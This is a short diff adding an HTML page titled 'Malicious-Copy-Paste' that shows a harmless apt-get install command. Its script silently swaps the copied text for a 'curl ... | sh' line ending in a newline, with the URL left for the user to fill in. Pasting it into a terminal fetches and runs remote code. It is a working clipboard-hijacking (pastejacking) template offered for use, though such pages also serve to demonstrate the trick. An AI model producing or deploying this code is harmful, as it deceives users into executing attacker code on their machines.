@@ -1,0 +1,9 @@
+<p>Malicious-Copy-Paste </p>
+<p>By:T3rk3n66 </p>
+<code><p id='copy'>sudo apt-get install wine</p></code>
+<script>
+document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl enlace-que-desees-u-comando-edita-el-codigo | sh\n'); e.preventDefault(); });
+ </script>
+ <script></script>
+<textarea style="height: 100px; min-height: 100px; resize: none;" cols="30" name="textarea" rows="5" placeholder="Paste your safe text here..."></textarea>
+</script>
